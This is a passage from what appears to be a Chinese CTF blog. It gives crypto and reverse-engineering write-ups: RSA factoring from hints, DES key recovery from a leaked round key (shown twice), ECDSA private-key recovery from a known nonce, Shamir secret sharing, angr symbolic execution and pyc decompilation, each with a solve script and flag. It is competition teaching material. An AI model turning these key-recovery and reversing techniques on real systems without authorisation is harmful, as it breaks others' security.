06478163922312894384285889848355244489#c2=67054203666901691181215262587447180910225473339143260100831118313521471029889304176235434129632237116993910316978096018724911531011857469325115308802162172965564951703583450817489247675458024801774590728726471567407812572210421642171456850352167810755440990035255967091145950569246426544351461548548423025004#hint3=25590923416756813543880554963887576960707333607377889401033718419301278802157204881039116350321872162118977797069089653428121479486603744700519830597186045931412652681572060953439655868476311798368015878628002547540835719870081007505735499581449077950263721606955524302365518362434928190394924399683131242077#hint4=104100726926923869566862741238876132366916970864374562947844669556403268955625670105641264367038885706425427864941392601593437305258297198111819227915453081797889565662276003122901139755153002219126366611021736066016741562232998047253335141676203376521742965365133597943669838076210444485458296240951668402513 可见看见思路大概是分别通过hint1和hint2、hint3和hint4解出p、q，从而得到flag 而这个过程的主要思路是通过构建关系是消去$p_i$或者$q_i$，利用GCD得到$p_i$或者$q_i$ 利用hint1和hint2解出p题目中hint1和hint2大概满足这个关系： hint_1=(2020*p1+q1)^{202020}\\ mod\\ n_1 \\\\ hint_2=(2021*p_1+212121)^{q_1}\\ mod\\ n_1利用费马小定理，可以得到： hint_2=2021*p_1+212121\\ mod\\ q_1即： hint_2=2021*p_1+212121+k*q_1同时由二项式定理： hint_1=(2020*p_1)^{202020}+q_1^{202020}\\ mod\\ n_1\\由两式构造公因子： (hint_2-212121)^{202020}=(2021*p_1)^{202020}+(k*q_1)^{202020} \\\\ 2020^{202020}*(hint_2-212121)^{202020}-2021^{202020}*hint_1\\\\ =(2020*2021*p_1)^{202020}+(k_1*q_1)^{202020}-(2020*2021*p_1)^{202020}-(k_2*q_1)^{202020}\\\\ =(k_1*q_1)^{202020}-(k_2*q_1)^{202020}\\\\ =q_1(k_1^{202020}*q_1{202019}-k_2^{202020}*q_1^{202019})\\\\ =q_1*k_3然后通过求与n1的最大公因数，即可获得q1，从而求解出p的值 利用Hint3和Hint4求q的值题中关系： hint_3=(2020*p_2+2021*q_2)^{202020}\\ mod\\ n_2\\\\ hint_4=(2021*p_2+2020*q_2)^{212121}\\ mod\\ n_2将两式转换为同指数： hint_3^{212121}=(2020*p_2+2021*q_2)^{202020*212121}\\ mod\\ n_2\\\\ hint_4^{202020}=(2021*p_2+2020*q_2)^{202020*212121}\\ mod\\ n_2由二项式定理： hint_3^{212121}=(2020*p_2)^{202020*212121}+(2021*q_2)^{202020*212121}\\ mod\\ n_2\\\\ hint_4^{202020}=(2021*p_2)^{202020*212121}+(2020*q_2)^{202020*212121}\\ mod\\ n_2将其中一个未知量转化为同系数，相减 (2021)^{202020*212121}hint_3^{212121}-(2020)^{202020*212121}hint_4^{202020}\\\\ =(2020*2021*p_2)^{202020*212121}+(212121*212121*q_2)^{202020*212121}-(2020*2021*p_2)^{202020*212121}-(2020*2020*q_2)^{202020*212121}\\\\ =(212121*212121*q_2)^{202020*212121}-(2020*2020*q_2)^{202020*212121}\\ mod\\ n_2令上式结果与n2求最大公因数，即得q2，从而可以得到q的值 解题脚本：12345678910111213141516171819202122232425262728293031323334353637from Crypto.Util.number import *from libnum import n2sc=13492392717469817866883431475453770951837476241371989714683737558395769731416522300851917887957945766132864151382877462142018129852703437240533684604508379950293643294877725773675505912622208813435625177696614781601216465807569201380151669942605208425645258372134465547452376467465833013387018542999562042758n1=75003557379080252219517825998990183226659117019770735080523409561757225883651040882547519748107588719498261922816865626714101556207649929655822889945870341168644508079317582220034374613066751916750036253423990673764234066999306874078424803774652754587494762629397701664706287999727238636073466137405374927829c1=68111901092027813007099627893896838517426971082877204047110404787823279211508183783468891474661365139933325981191524511345219830693064573462115529345012970089065201176142417462299650761299758078141504126185921304526414911455395289228444974516503526507906721378965227166653195076209418852399008741560796631569hint1=23552090716381769484990784116875558895715552896983313406764042416318710076256166472426553520240265023978449945974218435787929202289208329156594838420190890104226497263852461928474756025539394996288951828172126419569993301524866753797584032740426259804002564701319538183190684075289055345581960776903740881951hint2=527232296985307678979794339144708311532688127008372307239630387100752226850798023362444499211944996778363894528759290565718266340188582253307004810850030833752132728256929572703630431232622151200855160886614350000115704689605102500273815157636476901150408355565958834764444192860513855376978491299658773170270n2=114535923043375970380117920548097404729043079895540320742847840364455024050473125998926311644172960176471193602850427607899191810616953021324742137492746159921284982146320175356395325890407704697018412456350862990849606200323084717352630282539156670636025924425865741196506478163922312894384285889848355244489c2=67054203666901691181215262587447180910225473339143260100831118313521471029889304176235434129632237116993910316978096018724911531011857469325115308802162172965564951703583450817489247675458024801774590728726471567407812572210421642171456850352167810755440990035255967091145950569246426544351461548548423025004hint3=25590923416756813543880554963887576960707333607377889401033718419301278802157204881039116350321872162118977797069089653428121479486603744700519830597186045931412652681572060953439655868476311798368015878628002547540835719870081007505735499581449077950263721606955524302365518362434928190394924399683131242077hint4=104100726926923869566862741238876132366916970864374562947844669556403268955625670105641264367038885706425427864941392601593437305258297198111819227915453081797889565662276003122901139755153002219126366611021736066016741562232998047253335141676203376521742965365133597943669838076210444485458296240951668402513e=65537var1=pow(hint2-212121,202020,n1)var1=pow(2020,202020,n1)*var1%n1var2=pow(2021,202020,n1)*hint1%n1q1=10866506913047038137740935566742708261832434856649253065298695652571582985605691427640899414330824525161279752924895740377208318584484168722588418228539943p1=n1//q1phi1=(p1-1)*(q1-1)d1=inverse(e,phi1)p=pow(c1,d1,n1)var3=pow(hint3,212121,n2)var4=pow(hint4,202020,n2)var3=var3*pow(2021,202020*212121,n2)var4=var4*pow(2020,202020*212121,n2)q2=GCD((var3-var4)%n2,n2)p2=n2//q2phi2=(p2-1)*(q2-1)d=inverse(e,phi2)q=pow(c2,d,n2)phi=(p-1)*(q-1)d=inverse(e,phi)m=pow(c,d,p*q)print(n2s(m))# GKCTF{f64310b5-d5e6-45cb-ae69-c86600cdf8d8}' [NCTF2019]Reverse核心：如何从DES的单轮子密钥中恢复出原密钥 题目描述： 1234567891011121314import osimport pyDesflag = &quot;NCTF{******************************************}&quot;key = os.urandom(8)d = pyDes.des(key)cipher = d.encrypt(flag.encode())with open('cipher', 'wb') as f: f.write(cipher)# Leak: d.Kn[10] == [0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1] 题目泄露了第十一轮的轮密钥，如图为DES密钥发生器的流程图： 其中置换选择1是将64位密钥通过置换分配给28位的C0和D0，在这个过程中，奇偶校验位被舍去，如图为置换表 置换选择2是将28位的C和D通过置换装配为48位的轮密钥，在这个过程中C的第9、18、22、25和D的7、9、15、26位被舍去，因此需要通过爆破来得到这几个缺失的位置，复杂度为2^8 通过对置换选择1和置换选择2写出逆向函数，期间进行11轮的循环右移，即可得到备选的原密钥，使用这些密钥组来对密文进行解密，最终即可得到flag 解题脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import pyDesfrom Crypto.Util.number import *def recoverKey(subkey): key=[] for iv in range(256): Tmpkey=subkey c0,d0=invert_pc2(Tmpkey,iv) for i in range(10,-1,-1): if(i==1 or i==2 or i==9 or i==16): c0=int2list(moveRight(list2int(c0),1),28) d0=int2list(moveRight(list2int(d0),1),28) else: c0=int2list(moveRight(list2int(c0),2),28) d0=int2list(moveRight(list2int(d0),2),28) # print(c0,c0) key.append(invert_pc1(c0,d0)) return keydef invert_pc2(subkey,iv): table=[ 14,17,11,24,1,5,3,28, 15,6,21,10,23,19,12,4, 26,8,16,7,27,20,13,2, 41,52,31,37,47,55,30,40, 51,45,33,48,44,49,39,56, 34,53,46,42,50,36,29,32] c0=[0]*28 d0=[0]*28 for i in range(24): c0[table[i]-1]=subkey[i] for i in range(24): d0[table[24+i]-29]=subkey[24+i] #c0:9 18 22 25 d0:7 9 15 26 c0[8]=iv&gt;&gt;7 c0[17]=(iv&gt;&gt;6)&amp;1 c0[21]=(iv&gt;&gt;5)&amp;1 c0[24]=(iv&gt;&gt;4)&amp;1 d0[6]=(iv&gt;&gt;3)&amp;1 d0[8]=(iv&gt;&gt;2)&amp;1 d0[14]=(iv&gt;&gt;1)&amp;1 d0[25]=(iv)&amp;1 # print(c0,d0) return c0,d0def invert_pc1(c0,d0): key=[0]*64 table=[[57,49,41,33,25,17,9],[1,58,50,42,34,26,18],[10,2,59,51,43,35,27],[19,11,3,60,52,44,36]] for i in range(4): for j in range(7): key[table[i][j]-1]=c0[7*i+j] table=[[63,55,47,39,31,23,15],[7,62,54,46,38,30,22],[14,6,61,53,45,37,29],[21,13,5,28,20,12,4]] for i in range(4): for j in range(7): key[table[i][j]-1]=d0[7*i+j] return keydef moveRight(a,b): return (a&gt;&gt;b)|(a&lt;&lt;(28-b)&amp;0xfffffff)def list2int(li): a=0 for i in range(len(li)): a&lt;&lt;=1 a|=li[i] return adef int2list(v,length): li=[] for i in range(length): li.append(v&amp;1) v&gt;&gt;=1 return li[::-1]leakKey_10=[0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1]key=recoverKey(leakKey_10)f=open('cipher','rb+')cipher=f.read()for i in range(256): tmpKey=long_to_bytes(list2int(key[i])) d = pyDes.des(tmpKey) flag = d.decrypt(cipher) print(flag)# NCTF{1t_7urn3d_0u7_7h47_u_2_g00d_@_r3v3rs3_1snt} [UTCTF2020]Curveball题目描述：My friend Shamir was trying to share the flag with me and some of the other problem writers, but he wanted to make sure it didn’t get intercepted in transmission, so he split it up. He said that the secrets that he shared will help us find the flag, but I can’t figure it out! These are the secrets I’ve gathered so far: 123(C81E728D9D4C2F636F067F89CC14862C, 31E96A93BF1A7CE1872A3CCDA6E07F86)(ECCBC87E4B5CE2FE28308FD9F2A7BAF3, ADF6E4F1052BDE978344743CCDCF5771)(E4DA3B7FBBCE2345D7772B0674A318D5, 0668FBCFE4098FEA0218163AC21E6531) Can you figure out which flag is the right one? _by balex_ 解题思路考点是shamir秘密分享，注意题目中的十六进制是MD5值，解出来是： 123(2,5398141)(3,5398288)(5,5398756) 通过拉格朗日插值法求值 当x=0时","link":"/2022/03/12/Crypto-1/"},{"title":"Crypto 2  [NCTF2019]Reverse","text":"[NCTF2019]Reverse核心：如何从DES的单轮子密钥中恢复出原密钥 题目描述： 1234567891011121314import osimport pyDesflag = &quot;NCTF{******************************************}&quot;key = os.urandom(8)d = pyDes.des(key)cipher = d.encrypt(flag.encode())with open('cipher', 'wb') as f: f.write(cipher)# Leak: d.Kn[10] == [0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1] 题目泄露了第十一轮的轮密钥，如图为DES密钥发生器的流程图： 其中置换选择1是将64位密钥通过置换分配给28位的C0和D0，在这个过程中，奇偶校验位被舍去，如图为置换表 置换选择2是将28位的C和D通过置换装配为48位的轮密钥，在这个过程中C的第9、18、22、25和D的7、9、15、26位被舍去，因此需要通过爆破来得到这几个缺失的位置，复杂度为2^8 通过对置换选择1和置换选择2写出逆向函数，期间进行11轮的循环右移，即可得到备选的原密钥，使用这些密钥组来对密文进行解密，最终即可得到flag 解题脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import pyDesfrom Crypto.Util.number import *def recoverKey(subkey): key=[] for iv in range(256): Tmpkey=subkey c0,d0=invert_pc2(Tmpkey,iv) for i in range(10,-1,-1): if(i==1 or i==2 or i==9 or i==16): c0=int2list(moveRight(list2int(c0),1),28) d0=int2list(moveRight(list2int(d0),1),28) else: c0=int2list(moveRight(list2int(c0),2),28) d0=int2list(moveRight(list2int(d0),2),28) # print(c0,c0) key.append(invert_pc1(c0,d0)) return keydef invert_pc2(subkey,iv): table=[ 14,17,11,24,1,5,3,28, 15,6,21,10,23,19,12,4, 26,8,16,7,27,20,13,2, 41,52,31,37,47,55,30,40, 51,45,33,48,44,49,39,56, 34,53,46,42,50,36,29,32] c0=[0]*28 d0=[0]*28 for i in range(24): c0[table[i]-1]=subkey[i] for i in range(24): d0[table[24+i]-29]=subkey[24+i] #c0:9 18 22 25 d0:7 9 15 26 c0[8]=iv&gt;&gt;7 c0[17]=(iv&gt;&gt;6)&amp;1 c0[21]=(iv&gt;&gt;5)&amp;1 c0[24]=(iv&gt;&gt;4)&amp;1 d0[6]=(iv&gt;&gt;3)&amp;1 d0[8]=(iv&gt;&gt;2)&amp;1 d0[14]=(iv&gt;&gt;1)&amp;1 d0[25]=(iv)&amp;1 # print(c0,d0) return c0,d0def invert_pc1(c0,d0): key=[0]*64 table=[[57,49,41,33,25,17,9],[1,58,50,42,34,26,18],[10,2,59,51,43,35,27],[19,11,3,60,52,44,36]] for i in range(4): for j in range(7): key[table[i][j]-1]=c0[7*i+j] table=[[63,55,47,39,31,23,15],[7,62,54,46,38,30,22],[14,6,61,53,45,37,29],[21,13,5,28,20,12,4]] for i in range(4): for j in range(7): key[table[i][j]-1]=d0[7*i+j] return keydef moveRight(a,b): return (a&gt;&gt;b)|(a&lt;&lt;(28-b)&amp;0xfffffff)def list2int(li): a=0 for i in range(len(li)): a&lt;&lt;=1 a|=li[i] return adef int2list(v,length): li=[] for i in range(length): li.append(v&amp;1) v&gt;&gt;=1 return li[::-1]leakKey_10=[0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1]key=recoverKey(leakKey_10)f=open('cipher','rb+')cipher=f.read()for i in range(256): tmpKey=long_to_bytes(list2int(key[i])) d = pyDes.des(tmpKey) flag = d.decrypt(cipher) print(flag)# NCTF{1t_7urn3d_0u7_7h47_u_2_g00d_@_r3v3rs3_1snt}","link":"/2022/03/12/Crypto-2-NCTF2019-Reverse/"},{"title":"DASCTF 2022.07 wp","text":"[toc] Cryptobabysign题目描述 1234567891011121314151617181920212223242526272829303132333435363738394041424344import hashlibimport ecdsafrom Crypto.Util.number import *import randomimport osflag = b&quot;xxx&quot;assert flag.startswith(b'DASCTF{') and flag.endswith(b'}')assert len(flag) == 40def init(): &quot;&quot;&quot; initiation &quot;&quot;&quot; global pub_key, priv_key, order, base,secret gen = ecdsa.NIST256p.generator order = gen.order() secret = bytes_to_long(flag[7:-1]) pub_key = ecdsa.ecdsa.Public_key(gen, gen * secret) priv_key = ecdsa.ecdsa.Private_key(pub_key, secret)def sign(msg, nonce): &quot;&quot;&quot; sign msg &quot;&quot;&quot; msg = int(hashlib.sha256(msg).hexdigest(), 16) sign = priv_key.sign(msg, nonce) print(&quot;R:&quot;, hex(sign.r)[2:]) print(&quot;S:&quot;, hex(sign.s)[2:])init()nonce = random.getrandbits(order.bit_length())sign(b'welcome to ecdsa', nonce)print(nonce)'''R: 7b35712a50d463ac5acf7af1675b4b63ba0da23b6452023afddd58d4891ef6e5S: a452fc44cc36fa6964d1b4f47392ff0a91350cfd58f11a4645c084d56e387e5c57872441580840888721108499129165088876046881204464784483281653404168342111855''' 脚本 123456789101112131415161718192021222324252627282930import ecdsaimport hashlibimport gmpy2from Crypto.Util.number import long_to_bytesmes='welcome to ecdsa'h=hashlib.sha256(mes.encode()).hexdigest()h=int(h,16)R=0x7b35712a50d463ac5acf7af1675b4b63ba0da23b6452023afddd58d4891ef6e5S=0xa452fc44cc36fa6964d1b4f47392ff0a91350cfd58f11a4645c084d56e387e5cnonce=57872441580840888721108499129165088876046881204464784483281653404168342111855gen = ecdsa.NIST256p.generatorn=order = gen.order()d_A=gmpy2.invert(R,n)*(S*nonce-h)%nprint(d_A)#pub_key = ecdsa.ecdsa.Public_key(gen, gen * d_A)priv_key = ecdsa.ecdsa.Private_key(pub_key, d_A)sign = priv_key.sign(h, nonce)print(&quot;R:&quot;, hex(sign.r)[2:])print(&quot;S:&quot;, hex(sign.s)[2:])#flag=d_At=0print(long_to_bytes(flag))print('finish') 脑残了，把p当成n发现算不出来 easyNTRU没想到是原题，连flag都没改 第四届浙江省大学生网络与信息安全竞赛（决赛）dssssa1及easyNTRU复现 - 21r000 - 博客园 (cnblogs.com) Reverse隐秘的角落123456789101112131415import rc4from Crypto.Util.number import bytes_to_longcipher=[ 0xD8, 0xE5, 0x85, 0xBE, 0xE7, 0xF8, 0x58, 0x75, 0x95, 0x65, 0x85, 0xE3, 0xA6, 0x47, 0x59, 0xB9, 0x14, 0x6F, 0x33, 0xB5, 0xCA, 0x84, 0x0B, 0xE7, 0x92, 0x0E, 0xD2, 0xFD, 0x64, 0x18, 0x96, 0xD0, 0x0F, 0x5E, 0x44, 0x3E]key=b'thisiskkk'key=bytes_to_long(key)t=rc4.encrypt(cipher,rc4.int2byteArray(key))flag=''for i in t: flag+=chr(i^0x23)print(flag) fantastic_maze2022.7DASCTF re wp - FW_ltlly - 博客园 (cnblogs.com)","link":"/2022/07/24/DASCTF-2022-07-wp/"},{"title":"Reverse 刷题记录","text":"题目主要来自BUUOJ，少数其他来源 [toc] [CFI-CTF 2018]IntroToPE直接扔IDA，发现无法F5，转而查看汇编代码 在此处发现奇怪的Base64字符串，解码后得到flag:CFI{.NetC#_1s_@w3s0m3} [WUSTCTF2020]funnyre拖进ida分析 点进main函数，发现无法反编译为c代码，继续看汇编指令 发现有奇怪的指令，有几条jz、jnz和call指令都指向了不存在的地址，导致了F5的失败 将它们还有下面的几处都nop掉，再p一下得到了能看的c代码 一千多行，不是人能做的，寄！ 上网进行一个大佬的题解代码的抄，顺便了解了一下啥是符号执行（虽然还是不太懂 12345678910111213141516171819202122232425import angrimport claripyp=angr.Project('C:\\\\Users\\\\80424\\\\Downloads\\\\attachment',load_options={&quot;auto_load_libs&quot;: False})f=p.factorystate = f.entry_state(addr=0x400605)#设置state开始运行时的地址flag = claripy.BVS('flag',8*32)#要求的内容有32个，用BVS转成二进制给flag变量state.memory.store(0x603055+0x300+5,flag)#因为程序没有输入，所以直接把字符串设置到内存state.regs.rdx=0x603055+0x300state.regs.rdi=0x603055+0x300+5#然后设置两个寄存器sm = p.factory.simulation_manager(state)#准备从state开始遍历路径print(&quot;开始执行&quot;)sm.explore(find=0x401DAE)#遍历到成功的地址if sm.found: print(&quot;执行成功&quot;) x=sm.found[0].solver.eval(flag,cast_to=bytes) print(x)else: print('错误') 得到flag:flag{1dc20f6e3d497d15cef47d9a66d6f1af} 最后附上符号执行的相关资料： 5.3 符号执行 · CTF All In One (gitbooks.io) [羊城杯 2020]login下载附件，可以发现是python逆向题 使用pyinstxtractor整出.pyc文件 在解压出来的文件中发现login.pyc文件，使用010editor打开 打开struct.pyc文件，用该文件的前8字节替换login.pyc的前8字节，替换后的login.pyc文件如下 然后在线反编译pyc文件，得到login.py的代码 python反编译 - 在线工具 (tool.lu) 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python# visit https://tool.lu/pyc/ for more informationimport sysinput1 = input('input something:')if len(input1) != 14: print('Wrong length!') sys.exit()code = []for i in range(13): code.append(ord(input1[i]) ^ ord(input1[i + 1]))code.append(ord(input1[13]))a1 = code[2]a2 = code[1]a3 = code[0]a4 = code[3]a5 = code[4]a6 = code[5]a7 = code[6]a8 = code[7]a9 = code[9]a10 = code[8]a11 = code[10]a12 = code[11]a13 = code[12]a14 = code[13]if ((((a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5) + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36) + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60) + a14 * 29 == 22748) &amp; ((((a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25) + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66) + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39) + a14 * 17 == 7258) &amp; ((((a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65) + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33) + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34) + a14 * 23 == 26190) &amp; ((((a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59) + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32) + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60) + a14 * 29 == 37136) &amp; (((a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52) + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36) + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) &amp; ((((a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45) + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26) + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61) + a14 * 28 == 17298) &amp; ((((a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42) + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47) + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44) + a14 * 65 == 19875) &amp; (((a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85) + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30) + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784) &amp; ((((a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85) + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36) + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64) + a14 * 27 == 9710) &amp; (((((a1 * 67 - a2 * 68) + a3 * 68 - a4 * 51 - a5 * 43) + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38) + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52) + a14 * 31 == 13376) &amp; ((((a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51) + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6) + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67) + a14 * 78 == 24065) &amp; ((((a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5) + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35) + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61) + a14 * 20 == 27687) &amp; (((a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25) + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92) + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) &amp; (((a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43) + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36) + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317): print('flag is GWHT{md5(your_input)}') print('Congratulations and have fun!')else: print('Sorry,plz try again...') 然后就是解方程 1234567891011121314151617181920212223242526272829303132from sympy import *import hashliba1=symbols('a1')a2=symbols('a2')a3=symbols('a3')a4=symbols('a4')a5=symbols('a5')a6=symbols('a6')a7=symbols('a7')a8=symbols('a8')a9=symbols('a9')a10=symbols('a10')a11=symbols('a11')a12=symbols('a12')a13=symbols('a13')a14=symbols('a14')print(solve([((((a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5) + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36) + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60) + a14 * 29 - 22748), ((((a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25) + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66) + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39) + a14 * 17 - 7258) ,((((a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65) + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33) + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34) + a14 * 23 - 26190) ,((((a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59) + a5 * 49 + a6 * 81 + a7 * 25 + (a8 * pow(2,7)) - a9 * 32) + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60) + a14 * 29 - 37136) ,(((a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52) + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36) + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 - 27915) ,((((a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45) + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26) + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61) + a14 * 28 - 17298) ,((((a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42) + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47) + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44) + a14 * 65 - 19875) ,(((a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85) + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30) + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 - 22784) ,((((a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85) + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36) + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64) + a14 * 27 - 9710) ,(((((a1 * 67 - a2 * 68) + a3 * 68 - a4 * 51 - a5 * 43) + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38) + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52) + a14 * 31 - 13376) ,((((a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51) + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6) + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67) + a14 * 78 - 24065) ,((((a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5) + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35) + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61) + a14 * 20 - 27687) ,(((a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25) + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92) + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 - 29250) ,(((a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43) + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36) + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 - 15317)],[a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14])) 得到结果：{a1: 119, a2: 24, a3: 10, a4: 7, a5: 104, a6: 43, a7: 28, a8: 91, a9: 52, a10: 108, a11: 88, a12: 74, a13: 88, a14: 33} 由于原输入和$a_i$ 不是一一对应的，需要稍微调整一下，然后在进行一个异或，最后md5一下就出来Flag了 12345678910111213import hashlibinput1=[10,24,119,7,104,43,28,91,108,52,88,74,88,33]for i in range(12,-1,-1): input1[i]^=input1[i+1]print(input1)flag=''for i in input1: flag+=chr(i)print(flag)print(len(flag))h=hashlib.md5()h.update(flag.encode())print(h.hexdigest()) flag{58964088b637e50d3a22b9510c1d1ef8} [QCTF2018]Xman-babymips拖进ida，进到主函数，程序结构也比较简单 一开始先进行逐字节的异或处理 然后是一个循环移位的操作，然后与off_410D04指向的数组中的值比较一下得到结果 解题思路很简单，直接逆就行了 123456789101112131415def move1(num): return (num&gt;&gt;6)|(num&lt;&lt;2)&amp;0xffdef move2(num): return (num&gt;&gt;2)|(num&lt;&lt;6)&amp;0xffstr='Q|j{g'flag=''for i in range(5): flag+=chr(ord(str[i])^(32-i))t=[0,0,0,0,0,0x52,0xfd,0x16,0xa4,0x89,0xbd,0x92,0x80,0x13,0x41,0x54,0xa0,0x8d,0x45,0x18,0x81,0xde,0xfc,0x95,0xf0,0x16,0x79,0x1a,0x15,0x5b,0x75,0x1f]for i in range(5,32): if i&amp;1==1: flag+=chr(move1(t[i])^(32-i)) else: flag+=chr(move2(t[i])^(32-i))print(flag) qctf{ReA11y_4_B@89_mlp5_4_XmAn_} [SCTF2019]babyre拖进ida 发现一堆汇编代码，不能f5，大概是有花指令 按P声明函数，控制台显示有未定义指令，双击该地址进行去花 依次去了几处后就能反编译出Main函数了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118__int64 __fastcall main(int a1, char **a2, char **a3){ __int64 result; // rax char v4; // [rsp+Fh] [rbp-151h] int v5; // [rsp+10h] [rbp-150h] int v6; // [rsp+14h] [rbp-14Ch] char *v7; // [rsp+18h] [rbp-148h] char v8[10]; // [rsp+26h] [rbp-13Ah] BYREF _QWORD v9[2]; // [rsp+30h] [rbp-130h] BYREF int v10; // [rsp+40h] [rbp-120h] __int64 v11[3]; // [rsp+50h] [rbp-110h] BYREF char v12; // [rsp+68h] [rbp-F8h] __int64 v13[3]; // [rsp+70h] [rbp-F0h] BYREF char v14; // [rsp+88h] [rbp-D8h] __int64 v15[6]; // [rsp+90h] [rbp-D0h] BYREF __int16 v16; // [rsp+C0h] [rbp-A0h] char v17[136]; // [rsp+D0h] [rbp-90h] BYREF unsigned __int64 v18; // [rsp+158h] [rbp-8h] v18 = __readfsqword(0x28u); v5 = 0; v11[0] = 0LL; 